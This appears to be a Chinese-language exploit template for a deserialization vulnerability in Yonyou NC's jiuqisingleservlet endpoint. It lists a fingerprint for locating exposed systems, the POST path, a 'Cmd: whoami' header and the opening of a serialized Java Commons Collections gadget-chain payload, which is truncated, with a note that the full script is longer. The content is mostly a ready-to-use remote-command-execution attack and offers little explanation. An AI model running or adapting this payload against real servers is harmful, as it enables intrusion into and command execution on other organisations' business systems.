# 用友NCjiuqisingleservlet存在反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /servlet/~ufoe/jiuqisingleservlet HTTP/1.1`
- **关键头**：`Cmd: whoami`

**请求体 / payload**
```
{{unquote("\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x03foosr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec\x28z\x97\x04\x02\x00\x01\[\x00\x0diT…（脚本共 20484 字，完整版见原文）
```
- **预期**：200　|　—